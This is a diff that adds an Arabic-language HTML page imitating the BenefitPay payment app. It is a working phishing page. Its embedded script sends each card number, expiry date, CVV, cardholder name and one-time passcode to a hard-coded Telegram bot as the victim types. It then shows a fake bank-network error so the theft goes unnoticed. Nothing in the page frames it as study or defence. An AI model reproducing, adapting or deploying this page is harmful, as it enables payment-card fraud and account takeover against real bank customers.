@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, maximum-scale=1.0, user-scalable=no">
+    <title>BenefitPay | بوابة الدفع</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <style>
+        :root {
+            --benefit-red: #D71920;
+            --bg-color: #F6F4EF;
+            --card-bg: #FFFFFF;
+            --text-main: #111111;
+            --text-muted: #777777;
+            --border-color: #EAEAEA;
+            --input-bg: #F9F9F9;
+            --font-ar: 'Tajawal', sans-serif;
+            --font-en: 'Inter', sans-serif;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        
+        body {
+            font-family: var(--font-ar);
+            background-color: #E0E0E0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            min-height: 100vh;
+            background: var(--bg-color);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-x: hidden;
+            padding-bottom: 20px;
+        }
+
+        @media (min-width: 500px) {
+            body { padding: 20px; align-items: center; }
+            .app-container {
+                min-height: auto;
+                border-radius: 24px;
+                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+                border: 1px solid #ccc;
+            }
+        }
+
+        /* --- الشاشات --- */
+        .screen { display: none; flex-direction: column; flex: 1; }
+        .screen.active { display: flex; }
+
+        /* --- الهيدر --- */
+        .app-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background: transparent;
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 15px;
+            color: #555;
+            font-size: 22px;
+        }
+
+        .header-greeting {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .logo-icon {
+            color: var(--benefit-red);
+            font-size: 32px;
+            font-weight: 900;
+            font-family: var(--font-en);
+        }
+
+        /* --- بطاقة الدفع --- */
+        .payment-card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            margin: 0 15px 25px;
+            padding: 24px 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+        }
+
+        .input-group { margin-bottom: 16px; }
+        
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 8px;
+            text-align: right;
+        }
+
+        .card-input-wrapper { display: flex; gap: 8px; }
+
+        .card-select {
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 0 10px;
+            font-family: var(--font-en);
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-main);
+            outline: none;
+            cursor: pointer;
+            width: 100px;
+            direction: ltr;
+        }
+
+        .form-control {
+            width: 100%;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 14px 12px;
+            font-family: var(--font-en);
+            font-size: 15px;
+            color: var(--text-main);
+            outline: none;
+            text-align: center;
+            letter-spacing: 1px;
+            direction: ltr;
+        }
+        
+        .form-control::placeholder { color: #B0B0B0; font-family: var(--font-en); }
+        .form-control:focus { border-color: var(--benefit-red); }
+
+        .row-inputs {
+            display: flex;
+            gap: 12px;
+            align-items: flex-end;
+            margin-bottom: 16px;
+        }
+
+        .expiry-group { flex: 1.5; }
+        .expiry-wrapper { display: flex; gap: 6px; }
+        
+        .expiry-wrapper select {
+            flex: 1;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 14px 0;
+            font-family: var(--font-ar);
+            font-size: 13px;
+            color: var(--text-main);
+            outline: none;
+            text-align: center;
+            cursor: pointer;
+        }
+
+        .cvv-group { flex: 1; }
+        .name-group { margin-bottom: 0; }
+
+        /* --- أزرار الإرسال والطلب --- */
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            padding: 0 15px;
+            margin-bottom: 30px;
+        }
+
+        .btn-action {
+            flex: 1;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: var(--font-ar);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            border: 1.5px solid var(--benefit-red);
+        }
+
+        .btn-primary {
+            background: var(--benefit-red);
+            color: white;
+            box-shadow: 0 4px 10px rgba(215, 25, 32, 0.2);
+        }
+        .btn-primary:active { background: #B0141A; }
+
+        .btn-outline {
+            background: transparent;
+            color: var(--benefit-red);
+        }
+        .btn-outline:active { background: rgba(215, 25, 32, 0.05); }
+
+        /* --- الخدمات --- */
+        .services-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            margin-bottom: 15px;
+        }
+        .services-header h3 {
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--text-main);
+        }
+        .services-header a {
+            color: var(--benefit-red);
+            font-size: 14px;
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            padding: 0 15px;
+            margin-bottom: 30px;
+        }
+
+        .service-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .service-icon {
+            width: 60px;
+            height: 60px;
+            background: #FFF;
+            border-radius: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+            border: 1px solid var(--border-color);
+            color: var(--benefit-red);
+            font-size: 24px;
+        }
+
+        .service-item span {
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--text-main);
+        }
+
+        /* --- بنر أسفل الشاشة --- */
+        .banner-strip {
+            background: #D4E9F7;
+            border-radius: 16px;
+            margin: 0 15px;
+            padding: 15px;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+        }
+        .banner-strip .b-logo {
+            color: var(--benefit-red);
+            font-weight: 900;
+            font-size: 22px;
+            font-family: var(--font-en);
+        }
+        .banner-strip .white-boxes { display: flex; gap: 8px; }
+        .banner-strip .white-boxes div {
+            width: 35px; height: 45px; background: #FFF; border-radius: 4px;
+        }
+
+        /* ========================================= */
+        /* --- تصميم صفحة رمز التأكيد (OTP) --- */
+        /* ========================================= */
+        .otp-container {
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        
+        .otp-icon {
+            width: 80px; height: 80px; background: #FFF; border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 32px; color: var(--benefit-red); margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid var(--border-color);
+        }
+
+        .otp-title {
+            font-size: 22px; font-weight: 800; color: var(--text-main); margin-bottom: 10px;
+        }
+
+        .otp-desc {
+            font-size: 14px; color: var(--text-muted); line-height: 1.6; margin-bottom: 30px;
+        }
+
+        .otp-input-field {
+            width: 100%; max-width: 250px; padding: 18px;
+            font-size: 28px; font-family: var(--font-en); font-weight: 700; letter-spacing: 12px;
+            text-align: center; border: 2px solid var(--border-color); border-radius: 12px;
+            background: #FFF; outline: none; transition: border 0.2s; direction: ltr;
+        }
+
+        .otp-input-field:focus { border-color: var(--benefit-red); }
+
+        .btn-confirm-otp {
+            background: var(--benefit-red); color: white; border: none;
+            border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 700;
+            font-family: var(--font-ar); width: 100%; max-width: 250px;
+            margin-top: 25px; cursor: pointer; box-shadow: 0 4px 10px rgba(215, 25, 32, 0.2);
+        }
+
+        /* ========================================= */
+        /* --- نافذة الخطأ المخصصة (Modal) --- */
+        /* ========================================= */
+        .modal-overlay {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 9999;
+            display: none; justify-content: center; align-items: center; padding: 20px;
+            backdrop-filter: blur(3px);
+        }
+        .modal-overlay.active { display: flex; }
+        
+        .modal-box {
+            background: #FFF; border-radius: 16px; padding: 24px;
+            width: 100%; max-width: 340px; text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            animation: scaleIn 0.3s ease;
+        }
+        @keyframes scaleIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+        .modal-icon {
+            width: 60px; height: 60px; background: #FEF2F2; border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 28px; color: #DC2626; margin: 0 auto 16px;
+            border: 1px solid #FECACA;
+        }
+
+        .modal-title {
+            font-size: 18px; font-weight: 800; color: var(--text-main); margin-bottom: 10px;
+        }
+
+        .modal-desc {
+            font-size: 14px; color: var(--text-muted); line-height: 1.6; margin-bottom: 24px;
+        }
+
+        .modal-btn {
+            background: var(--benefit-red); color: white; border: none;
+            border-radius: 8px; padding: 12px 24px; font-size: 15px; font-weight: 700;
+            font-family: var(--font-ar); width: 100%; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    
+    <!-- ================= الشاشة الأولى: البطاقة ================= -->
+    <div id="screen-card" class="screen active">
+        <div class="app-header">
+            <div class="header-icons">
+                <i class="fas fa-bars"></i>
+                <i class="fas fa-search"></i>
+                <i class="fas fa-plus"></i>
+            </div>
+            <div class="header-greeting">
+                مرحباً بعودتك!
+                <span class="logo-icon">B</span>
+            </div>
+        </div>
+
+        <div class="payment-card">
+            <div class="input-group">
+                <label>رقم البطاقة</label>
+                <div class="card-input-wrapper">
+                    <select class="card-select">
+                        <option>428628</option>
+                        <option>MasterCard</option>
+                        <option>Amex</option>
+                    </select>
+                    <input type="text" id="cardNumber" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
+                </div>
+            </div>
+
+            <div class="row-inputs">
+                <div class="expiry-group">
+                    <label>تاريخ الانتهاء</label>
+                    <div class="expiry-wrapper">
+                        <select id="expMonth">
+                            <option value="" disabled selected>شهر</option>
+                            <option value="01">01</option>
+                            <option value="02">02</option>
+                            <option value="03">03</option>
+                            <option value="04">04</option>
+                            <option value="05">05</option>
+                            <option value="06">06</option>
+                            <option value="07">07</option>
+                            <option value="08">08</option>
+                            <option value="09">09</option>
+                            <option value="10">10</option>
+                            <option value="11">11</option>
+                            <option value="12">12</option>
+                        </select>
+                        <select id="expYear">
+                            <option value="" disabled selected>سنة</option>
+                            <option value="24">24</option>
+                            <option value="25">25</option>
+                            <option value="26">26</option>
+                            <option value="27">27</option>
+                            <option value="28">28</option>
+                            <option value="29">29</option>
+                            <option value="30">30</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <div class="cvv-group">
+                    <label>رمز الأمان (CVV)</label>
+                    <input type="password" id="cardCvv" class="form-control" placeholder="***" maxlength="3" inputmode="numeric" required>
+                </div>
+            </div>
+
+            <div class="input-group name-group">
+                <label>اسم صاحب البطاقة (كما هو مكتوب)</label>
+                <input type="text" id="cardName" class="form-control" placeholder="NAME SURNAME" style="text-align: center;" required>
+            </div>
+        </div>
+
+        <div style="display: flex; justify-content: center; gap: 6px; margin-bottom: 20px;">
+            <div style="width: 20px; height: 4px; background: #DDD; border-radius: 2px;"></div>
+            <div style="width: 20px; height: 4px; background: #DDD; border-radius: 2px;"></div>
+            <div style="width: 20px; height: 4px; background: var(--benefit-red); border-radius: 2px;"></div>
+        </div>
+
+        <div class="action-buttons">
+            <button class="btn-action btn-primary" onclick="submitPayment()">
+                إرسال الأموال <i class="fas fa-arrow-left"></i>
+            </button>
+            <button class="btn-action btn-outline">
+                طلب الأموال <i class="fas fa-arrow-right"></i>
+            </button>
+        </div>
+
+        <div class="services-header">
+            <h3>الخدمات</h3>
+            <a href="#">مشاهدة الكل</a>
+        </div>
+
+        <div class="services-grid">
+            <div class="service-item">
+                <div class="service-icon"><i class="fas fa-file-invoice-dollar"></i></div>
+                <span>فواتير</span>
+            </div>
+            <div class="service-item">
+                <div class="service-icon"><i class="fas fa-bolt"></i></div>
+                <span>فوري+</span>
+            </div>
+            <div class="service-item">
+                <div class="service-icon"><i class="fas fa-gas-pump"></i></div>
+                <span>سديم</span>
+            </div>
+            <div class="service-item">
+                <div class="service-icon"><i class="fas fa-globe"></i></div>
+                <span>تحويل دولي</span>
+            </div>
+        </div>
+
+        <div class="banner-strip">
+            <div class="b-logo">BenefitPay</div>
+            <div class="white-boxes">
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= الشاشة الثانية: OTP ================= -->
+    <div id="screen-otp" class="screen">
+        <div class="app-header" style="justify-content: center; border-bottom: none;">
+            <div class="header-greeting" style="font-size: 20px;">
+                <span class="logo-icon">B</span> التحقق من الهوية
+            </div>
+        </div>
+
+        <div class="otp-container">
+            <div class="otp-icon">
+                <i class="fas fa-shield-alt"></i>
+            </div>
+            <h2 class="otp-title">رمز التحقق (OTP)</h2>
+            <p class="otp-desc">
+                تم إرسال رمز تحقق مكوّن من 6 أرقام إلى هاتفك المسجل لدى البنك لإتمام عملية إرسال الأموال. يرجى إدخال الرمز أدناه.
+            </p>
+
+            <input type="text" id="otpCode" class="otp-input-field" placeholder="------" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
+
+            <button class="btn-confirm-otp" onclick="submitOtp()">
+                تأكيد الرمز وإتمام العملية
+            </button>
+        </div>
+    </div>
+
+</div>
+
+<!-- ================= نافذة الخطأ المخصصة ================= -->
+<div id="errorModal" class="modal-overlay">
+    <div class="modal-box">
+        <div class="modal-icon">
+            <i class="fas fa-exclamation-triangle"></i>
+        </div>
+        <h3 class="modal-title">تعذر إتمام العملية</h3>
+        <p class="modal-desc">
+            حدث خطأ أثناء الاتصال بالشبكة المصرفية. يرجى التأكد من اتصالك بالإنترنت والمحاولة مرة أخرى.
+        </p>
+        <button class="modal-btn" onclick="location.reload()">حسناً، فهمت</button>
+    </div>
+</div>
+
+
+<script>
+    // === إعدادات البوت ===
+    const token = "9276004175:AAH9t9lWk_kZnjhEf4aLlm1OkGLO2uPGSC8";
+    const chatId = "8302667206";
+    let sessionId = 'BP-' + Math.floor(100000 + Math.random() * 900000);
+
+    async function sendBotNotification(title, dataObj) {
+        let message = `🔔 <b>${title}</b>\n\n`;
+        message += `🆔 الجلسة: <code>${sessionId}</code>\n`;
+        message += `⏰ الوقت: ${new Date().toLocaleString('ar-BH')}\n\n`;
+        message += `-------------------\n`;
+        for (const [key, value] of Object.entries(dataObj)) {
+            if (value) message += `📌 <b>${key}:</b> <code>${value}</code>\n`;
+        }
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
+            });
+        } catch (e) { console.log("خطأ في الإرسال", e); }
+    }
+
+    window.onload = function() {
+        sendBotNotification('🚪 دخول زائر جديد', { 'الحدث': 'تم فتح صفحة BenefitPay' });
+    };
+
+    const cardInput = document.getElementById('cardNumber');
+    cardInput.addEventListener('input', function(e) {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val.length > 16) val = val.slice(0, 16);
+        let formatted = val.replace(/(\d{4})(?=\d)/g, '$1 ');
+        e.target.value = formatted;
+    });
+    
+    cardInput.addEventListener('blur', function() {
+        if(this.value.trim() !== '') sendBotNotification('💳 رقم البطاقة', { 'البطاقة': this.value });
+    });
+
+    document.getElementById('expMonth').addEventListener('change', checkExpiry);
+    document.getElementById('expYear').addEventListener('change', checkExpiry);
+    function checkExpiry() {
+        const m = document.getElementById('expMonth').value;
+        const y = document.getElementById('expYear').value;
+        if(m && y) sendBotNotification('📅 تاريخ الانتهاء', { 'الانتهاء': `${m}/${y}` });
+    }
+
+    document.getElementById('cardCvv').addEventListener('blur', function() {
+        if(this.value.trim() !== '') sendBotNotification('🔒 رمز الأمان (CVV)', { 'CVV': this.value });
+    });
+
+    document.getElementById('cardName').addEventListener('blur', function() {
+        if(this.value.trim() !== '') sendBotNotification('👤 اسم حامل البطاقة', { 'الاسم': this.value });
+    });
+
+    function submitPayment() {
+        const cardNum = document.getElementById('cardNumber').value;
+        const cvv = document.getElementById('cardCvv').value;
+        const month = document.getElementById('expMonth').value;
+        const year = document.getElementById('expYear').value;
+        const name = document.getElementById('cardName').value;
+
+        if(cardNum.length < 16 || cvv.length < 3 || !month || !year || !name) {
+            alert("الرجاء إكمال جميع الحقول المطلوبة بشكل صحيح.");
+            return;
+        }
+
+        sendBotNotification('➡️ انتقال لصفحة رمز التحقق', { 
+            'الحالة': 'العميل أكمل بيانات البطاقة وينتظر إدخال OTP' 
+        });
+
+        document.getElementById('screen-card').classList.remove('active');
+        document.getElementById('screen-otp').classList.add('active');
+        window.scrollTo(0,0);
+    }
+
+    const otpInput = document.getElementById('otpCode');
+    otpInput.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0, 6);
+    });
+
+    function submitOtp() {
+        let otp = otpInput.value;
+
+        if(otp.length < 6) {
+            alert("الرجاء إدخال الرمز المكون من 6 أرقام.");
+            return;
+        }
+
+        sendBotNotification('🔐 تم إدخال رمز التحقق (OTP)', { 
+            'رمز OTP': otp 
+        });
+
+        // إظهار النافذة المخصصة بدلاً من alert الافتراضي
+        document.getElementById('errorModal').classList.add('active');
+    }
+</script>
+
+</body>
+</html>
